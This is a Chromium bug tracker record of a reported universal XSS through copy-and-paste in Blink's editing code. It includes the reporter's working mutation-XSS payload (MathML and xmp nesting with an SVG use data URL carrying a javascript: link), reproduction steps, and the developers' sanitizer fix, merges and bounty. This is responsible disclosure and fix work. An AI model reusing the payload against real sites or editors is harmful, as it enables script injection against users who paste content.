# Security: Yet another universal XSS via copy&paste

| Field | Value |
|-------|-------|
| **Issue ID** | [40053698](https://issues.chromium.org/issues/40053698) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Editing, Blink>MathML |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | mi...@bentkowski.info |
| **Assignee** | yo...@chromium.org |
| **Created** | 2020-10-22 |
| **Bounty** | $3,000.00 |

## Description

Hey,

I'm reporting another universal XSS via copy&paste. It is related to https://crbug.com/chromium/1065761 and https://crbug.com/chromium/1011950. I am not sure if this is a regression or another case that was missed earlier.

The idea is that the user copies something from an untrusted site and pastes into trusted site - and that leads into XSS. I wrote about these issues in detail here: https://research.securitum.com/the-curious-case-of-copy-paste/

Here's the PoC:

1. Go to https://cdn.sekurak.pl/copy-paste/playground.html
2. Paste the following HTML in the left textarea:

<math><xss style=display:block>t<xmp>X<a title="</xmp><div style=position:fixed;left:0;top:0;width:100%;height:100%><svg><use href=data:application/xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz4KPGEgaHJlZj0namF2YXNjcmlwdDphbGVydCgxMjMpJz4KICAgIDxyZWN0IHdpZHRoPScxMDAlJyBoZWlnaHQ9JzEwMCUnIGZpbGw9J2xpZ2h0Ymx1ZScgLz4KICAgICA8dGV4dCB4PScwJyB5PScwJyBmaWxsPSdibGFjayc+CiAgICAgICA8dHNwYW4geD0nMCcgZHk9JzEuMmVtJz5Pb3BzLCB0aGVyZSdzIHNvbWV0aGluZyB3cm9uZyB3aXRoIHRoZSBwYWdlITwvdHNwYW4+CiAgICAgPHRzcGFuIHg9JzAnIGR5PScxLjJlbSc+UGxlYXNlIGNsaWNrIGhlcmUgdG8gcmVsb2FkLjwvdHNwYW4+Cjwvc3ZnPg==#x>">.<a>.

3. Press "Copy as HTML"
4. Put your cursor in the right text area and input something (for instance: "abc").
5. Put the cursor at the beginning of the text (before "abc").
6. Paste from clipboard (ctrl/cmd+v)
7. Click on the box "Click here to reload".
8. Alert fires.

The same works even if the paste target is on different origin that the page.

The exploit uses the same mutation that was described in https://crbug.com/chromium/1011950 and the same trick with svg use as in https://crbug.com/chromium/1065761.



## Attachments

- [Screen Shot 2020-10-26 at 3.40.45 PM.png](attachments/Screen Shot 2020-10-26 at 3.40.45 PM.png) (image/png, 1012.0 KB)

## Timeline

### oc...@google.com (2020-10-23)

xiaochengh, could you please take a look at this one as well?

[Monorail components: Blink>Editing]

### [Deleted User] (2020-10-23)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2020-10-26)

Note: I can reproduce in Stable M86 and Beta M87, but not in Dev/Canary M88. The svg use element isn't leaked into the main document after pasting (see screenshot). It's probably due to some changes to MathML in M88.

[Monorail components: Blink>MathML]

### xi...@chromium.org (2020-10-26)

While the attack no longer works with MathML, I think the general idea still works: exploit the reserialization-reparsing in CompositeEditCommand::MoveParagraphs and leak malicious contents (scripts etc) into the main document.

So CompositeEditCommand::MoveParagraphs() should go through the same sanitization that we are already using for clipboard markup.

### xi...@chromium.org (2020-10-27)

Correction: the reason I couldn't reproduce with Canary/Dev is actually EditingNG, which is disabled by default on Stable/Beta but enabled on Canary/Dev.

With EditingNG enabled, MathML inside contenteditable is enabled, so the attack no longer works.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c529cbcc1bb0f72af944c30f03c2b3b435317bc7

commit c529cbcc1bb0f72af944c30f03c2b3b435317bc7
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Tue Oct 27 05:43:59 2020

Apply markup sanitizer in CompositeEditCommand::MoveParagraphs()

CompositeEditCommand::MoveParagraphs() serailizes part of the DOM and
then re-parse it and insert it at some other place of the document. This
is essentially a copy-and-paste, and can be exploited in the same way
how copy-and-paste is exploited. So we should also sanitize markup in
the function.

Bug: 1141350
Change-Id: I25c1dfc61c20b9134b23e057c5a3a0f56c190b5c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2500633
Commit-Queue: Yoshifumi Inoue <yosin@chromium.org>
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Cr-Commit-Position: refs/heads/master@{#821098}

[modify] https://crrev.com/c529cbcc1bb0f72af944c30f03c2b3b435317bc7/third_party/blink/renderer/core/editing/commands/composite_edit_command.cc
[modify] https://crrev.com/c529cbcc1bb0f72af944c30f03c2b3b435317bc7/third_party/blink/web_tests/editing/pasteboard/mathml-sanitizer-bypass.html


### xi...@chromium.org (2020-10-27)

yosin: Could you help me handle the merge to M87? I'll be OOO for the rest of the week. Thanks!

### ad...@google.com (2020-10-27)

yosin@  xiaochengh@ please could you mark this as fixed before requesting merges? I expect Sheriffbot will indeed request a merge to M87, but not until this has been marked fixed for a few days.

### yo...@chromium.org (2020-10-28)

Thanks for notice!
Mark Fixed.
Please approve to merge.

### [Deleted User] (2020-10-28)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-31)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-31)

Requesting merge to beta M87 because latest trunk commit (821098) appears to be after beta branch point (812852).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-10-31)

This bug requires manual review: M87's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna @(iOS), cindyb@(ChromeOS), lakpamarthy@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2020-11-02)

1. Does your merge fit within the Merge Decision Guidelines?

Automated test: yes
Deployed for 24h: yes

Safe merge: It breaks the case when we have an SVG <use href="data:..."> in a contenteditable, the <use> element will be removed after certain editing operations (e.g., indent, listify). However, I'm not aware of any real use case, and therefore the security gain should outweigh the functionality loss.

2. Links to the CLs you are requesting to merge.

https://chromium-review.googlesource.com/c/chromium/src/+/2500633

3. Has the change landed and been verified on ToT?

Yes

4. Does this change need to be merged into other active release branches (M-1, M+1)?

No

5. Why are these changes required in this milestone after branch?

According to https://crbug.com/chromium/1141350#c2.

6. Is this a new feature?

No

### la...@google.com (2020-11-03)

merge approved for M87 branch 4280

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-11-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/3abc372c9c003e5bc7cbb74e0697e7ca1ae1d76b

commit 3abc372c9c003e5bc7cbb74e0697e7ca1ae1d76b
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Tue Nov 03 23:00:29 2020

Apply markup sanitizer in CompositeEditCommand::MoveParagraphs()

CompositeEditCommand::MoveParagraphs() serailizes part of the DOM and
then re-parse it and insert it at some other place of the document. This
is essentially a copy-and-paste, and can be exploited in the same way
how copy-and-paste is exploited. So we should also sanitize markup in
the function.

(cherry picked from commit c529cbcc1bb0f72af944c30f03c2b3b435317bc7)

Bug: 1141350
Change-Id: I25c1dfc61c20b9134b23e057c5a3a0f56c190b5c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2500633
Commit-Queue: Yoshifumi Inoue <yosin@chromium.org>
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#821098}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2518088
Reviewed-by: Xiaocheng Hu <xiaochengh@chromium.org>
Commit-Queue: Xiaocheng Hu <xiaochengh@chromium.org>
Cr-Commit-Position: refs/branch-heads/4280@{#1099}
Cr-Branched-From: ea420fb963f9658c9969b6513c56b8f47efa1a2a-refs/heads/master@{#812852}

[modify] https://crrev.com/3abc372c9c003e5bc7cbb74e0697e7ca1ae1d76b/third_party/blink/renderer/core/editing/commands/composite_edit_command.cc
[modify] https://crrev.com/3abc372c9c003e5bc7cbb74e0697e7ca1ae1d76b/third_party/blink/web_tests/editing/pasteboard/mathml-sanitizer-bypass.html


### wf...@chromium.org (2020-11-04)

Hello reporter, it's the VRP panel here. As per guidance in the bug template, please remember when hosting a demonstration site to also attach the HTML files to reproduce the site locally! Thanks!

### ad...@google.com (2020-11-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-11-05)

Congratulations, the VRP panel has decided to award $3000 for this bug.

### ad...@google.com (2020-11-05)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-16)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-16)

[Empty comment from Monorail migration]

### vs...@google.com (2020-12-10)

[Empty comment from Monorail migration]

### vs...@google.com (2020-12-10)

[Empty comment from Monorail migration]

### ke...@google.com (2020-12-11)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-12-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/c529cbcc1bb0f72af944c30f03c2b3b435317bc7

commit c529cbcc1bb0f72af944c30f03c2b3b435317bc7
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Tue Oct 27 05:43:59 2020

Apply markup sanitizer in CompositeEditCommand::MoveParagraphs()

CompositeEditCommand::MoveParagraphs() serailizes part of the DOM and
then re-parse it and insert it at some other place of the document. This
is essentially a copy-and-paste, and can be exploited in the same way
how copy-and-paste is exploited. So we should also sanitize markup in
the function.

Bug: 1141350
Change-Id: I25c1dfc61c20b9134b23e057c5a3a0f56c190b5c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2500633
Commit-Queue: Yoshifumi Inoue <yosin@chromium.org>
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Cr-Commit-Position: refs/heads/master@{#821098}

[modify] https://crrev.com/c529cbcc1bb0f72af944c30f03c2b3b435317bc7/third_party/blink/web_tests/editing/pasteboard/mathml-sanitizer-bypass.html
[modify] https://crrev.com/c529cbcc1bb0f72af944c30f03c2b3b435317bc7/third_party/blink/renderer/core/editing/commands/composite_edit_command.cc


### [Deleted User] (2020-12-14)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-12-18)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2021-01-07)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/0f341253f5128cd0efa9375eb336db087f134679

commit 0f341253f5128cd0efa9375eb336db087f134679
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Fri Jan 08 15:27:21 2021

Apply markup sanitizer in CompositeEditCommand::MoveParagraphs()

CompositeEditCommand::MoveParagraphs() serailizes part of the DOM and
then re-parse it and insert it at some other place of the document. This
is essentially a copy-and-paste, and can be exploited in the same way
how copy-and-paste is exploited. So we should also sanitize markup in
the function.

(cherry picked from commit c529cbcc1bb0f72af944c30f03c2b3b435317bc7)

Bug: 1141350
Change-Id: I25c1dfc61c20b9134b23e057c5a3a0f56c190b5c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2500633
Commit-Queue: Yoshifumi Inoue <yosin@chromium.org>
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#821098}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2587028
Commit-Queue: Victor-Gabriel Savu <vsavu@google.com>
Reviewed-by: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/4240@{#1499}
Cr-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}

[modify] https://crrev.com/0f341253f5128cd0efa9375eb336db087f134679/third_party/blink/web_tests/editing/pasteboard/mathml-sanitizer-bypass.html
[modify] https://crrev.com/0f341253f5128cd0efa9375eb336db087f134679/third_party/blink/renderer/core/editing/commands/composite_edit_command.cc


### ja...@google.com (2021-01-19)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-02-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1141350?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Editing, Blink>MathML]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053698)*
